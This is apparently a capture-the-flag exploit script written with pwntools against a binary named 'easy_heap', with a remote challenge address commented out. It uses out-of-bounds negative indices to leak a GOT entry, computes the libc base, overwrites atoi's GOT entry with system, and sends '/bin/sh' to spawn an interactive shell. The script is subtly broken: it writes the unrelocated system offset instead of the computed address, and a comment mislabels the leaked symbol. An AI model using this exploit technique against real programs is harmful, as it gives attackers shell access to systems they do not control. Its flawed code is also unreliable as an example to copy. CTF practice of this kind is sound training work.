
from pwn import *

e = ELF("./easy_heap")
libc = ELF("./easyheap_libc.so.6")

p = process("./easy_heap")
#p = remote('35.198.185.193',1338)

p.recv()
name = p32(e.got["read"]) #Gets address of the atoi in binary - 0x804b038 
name += p32(e.got["atoi"])
name += "A"*(32-len(name))

p.sendline(name)
p.recv()
p.sendline("age")
p.recv()

p.sendline("4")
p.sendafter("Index:", "-1073741808") #index calculated from heap

log.info("Sends index to the name address, which has atoi")

p.recvuntil(": ")
data = p.recvuntil("\n", drop=True)
p.recvuntil("Your choice: ")

libc_address = u32(data[:4]) - libc.symbols["read"]  #[:4] only gets name[0] off the heap

log.info("Calculates libc_address from the return of the atoi and where atoi is in libc")

system_addr = libc_address + libc.symbols['system']

log.info("Gets the system address ")

p.sendline("2")
p.sendlineafter("Index: ", "-1073741807")
p.sendlineafter("name: ", p32(libc.symbols['system']))
p.recvuntil("Your choice: ")    

p.sendline("/bin/sh")
p.interactive()


#0x08048b1a